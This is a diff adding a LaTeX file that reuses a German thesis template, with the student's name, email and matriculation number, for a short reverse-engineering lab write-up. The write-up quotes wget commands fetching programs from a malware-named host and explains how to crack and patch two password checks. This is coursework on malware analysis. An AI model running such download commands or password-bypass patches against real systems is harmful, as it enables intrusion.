@@ -1,0 +1,137 @@
+\NeedsTeXFormat{LaTeX2e}
+\documentclass[a4paper,12pt,
+headsepline,           % Linie zw. Kopfzeile und Text
+twoside,               % zweiseitig
+pointlessnumbers,      % keine Punkte nach den letzten Ziffern in Überschriften
+bibtotoc,              % LV im IV
+%DIV=15,               % Satzspiegel auf 15er Raster, schmalere Ränder   
+BCOR15mm               % Bindekorrektur
+%,draft
+]{scrbook}
+\KOMAoptions{DIV=last} % Neuberechnung Satzspiegel nach Laden von Paket helvet
+
+\pagestyle{headings}
+\usepackage{blindtext}
+
+% für Texte in deutscher Sprache
+\usepackage[ngerman]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+
+% Helvetica als Standard-Dokumentschrift
+\usepackage[scaled]{helvet}
+%\usepackage{mathptmx}
+\renewcommand{\familydefault}{\sfdefault} 
+
+\usepackage{graphicx}
+
+% Für Tabellen mit fester Gesamtbreite und variabler Spaltenbreite
+\usepackage{tabularx} 
+
+% Besondere Schriftauszeichnungen
+\usepackage{url}              % \url{http://...} in Schreibmaschinenschrift
+\usepackage{color}            % zum Setzen farbigen Textes
+
+\usepackage{amssymb, amsmath} % Pakete für Mathe-Umgebungen und -Symbole
+
+\usepackage{setspace}         % Paket für div. Abstände, z.B. ZA
+%\onehalfspacing              % nur dann, wenn gefordert; ist sehr groß!!
+\setlength{\parindent}{0pt}   % kein linker Einzug der ersten Absatzzeile
+\setlength{\parskip}{1.4ex plus 0.35ex minus 0.3ex} % Absatzabstand, leicht variabel
+
+% Tiefe, bis zu der Überschriften in das Inhaltsverzeichnis kommen
+\setcounter{tocdepth}{3}      % ist Standard
+
+
+%\usepackage[printonlyused, withpage]{acronym}
+\usepackage[printonlyused]{acronym}
+\usepackage{comment}
+\usepackage{longtable}
+%\usepackage[maxdepth=8, mark]{gitinfo2}
+\usepackage{bytefield}
+\usepackage{smartdiagram}
+\usepackage{caption}
+\usepackage{hyperref}
+\usepackage{hypcap}
+\usepackage{graphicx}
+\usepackage{tikz}
+\usepackage{mathtools}
+\usepackage{colortbl}
+\usepackage{xcolor}
+\usepackage[outline]{contour}
+\usetikzlibrary{arrows}
+\usetikzlibrary{calc,positioning,shapes,decorations.pathreplacing, matrix, backgrounds, fit}
+
+% hier Namen etc. einsetzen
+\newcommand{\fullname}{Björn Petersen}
+\newcommand{\email}{bjoern.petersen@uni-ulm.de}
+\newcommand{\titel}{Darstellung und Analyse SoC interner Kommunikationskanäle auf Protokollebene}
+\newcommand{\jahr}{2020}
+\newcommand{\matnr}{941984}
+\newcommand{\gutachterA}{Prof.\,Dr.-Ing\,Maurits Ortmanns}
+\newcommand{\gutachterB}{Dr.\,rer.\,nat.\,Dipl.-Ing\,Endric Schubert}
+\newcommand{\betreuer}{Dipl-Ing\, Ulrich Langenbach}
+
+% hier die Fakultät auswählen
+%\newcommand{\fakultaet}{---  Im Quellcode anpassen nicht vergessen! ---}
+\newcommand{\fakultaet}{Ingenieurwissenschaften, Informatik und\\Psychologie}
+%\newcommand{\fakultaet}{Mathematik und\\Wirtschafts-\\wissenschaften}
+%\newcommand{\fakultaet}{Medizin}
+%\newcommand{\fakultaet}{Naturwissenschaften}
+
+% hier das Institut einsetzen
+\newcommand{\institut}{Institut für Mikroelektronik}
+
+% Informationen, die LaTeX in die PDF-Datei schreibt
+\pdfinfo{
+  /Author (\fullname)
+  /Title (\titel)
+  /Producer     (pdfeTex 3.14159-1.30.6-2.2)
+  /Keywords ()
+}
+
+\usepackage{hyperref}
+\hypersetup{
+pdftitle=\titel,
+pdfauthor=\fullname,
+pdfsubject={Diplomarbeit},
+pdfproducer={pdfeTex 3.14159-1.30.6-2.2},
+colorlinks=false,
+pdfborder=0 0 0	% keine Box um die Links!
+}
+
+\usepackage{listings}
+\lstset{
+  language=bash,
+  basicstyle=\ttfamily,
+  columns=fullflexible,
+  frame=single,
+  breaklines=true,
+  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}
+}
+
+% Trennungsregeln
+\hyphenation{Sil-ben-trenn-ung}
+
+\begin{document}
+
+\section*{Einführung}
+Durch das ausführen des Programms erscheinen die Programme 02\_a, 02\_b und 03, der nachfolgenden Aufgaben, auf dem Desktop. 
+Nun soll das Programm 01 mit Ghidra untersucht werden. Es werden 3 \texttt{wget} Anweisungen gefunden:
+\begin{lstlisting}
+  wget -q http://malware.h4.xx0r/02_a
+  wget -q http://malware.h4.xx0r/02_b
+  wget -q http://malware.h4.xx0r/03
+\end{lstlisting}
+Es lässt sich mittels \texttt{dig} herausfinden, dass der DNS Eintrag auf localhost zeigt, was bedeutet, dass ein Webserver in der VM läuft.
+
+\section*{Advanced}
+\subsection*{Aufgabenteil a}
+Durch Dekompilieren von Ghidra und interpretieren des C Codes wird klar, dass das Programm 2 Arumente entgegen nimmt, ein Passwort und eine Chiffre. Das Passwort hat eine Länge von 10 Zeichen, wobei Groß und Kleinschreibung irrelevant ist.
+Das Passwort wird zu beginn zeichenweise in einen Integer umgerechnet, mit zehn multipliziert und anschließend modulo 26 gerechnet. Nun wird der Wert auf den ASCII Wert von 'a' gerechnet und zu einem Character konvertiert.
+Wendet man den Algorithmus auf de Character 'a' direkt an, folgt der Character 'i' daraus. Eine korrekte Eingabe ist: "aaaaaaaaaa iiiiiiiiii".
+
+\subsection*{Aufgabenteil b}
+Durch analysieren des Codes stellt man fest, dass das Passwort immer eine zufällige Permutation aller Zeichen eines Strings im Code ist, der initiert ist mit "0123456789". Patcht man diesen String wie in der Vorlesung beschrieben zu 0000000000 sind alle Passwörter Permutation von 0, also wieder 0000000000.
+
+\end{document}
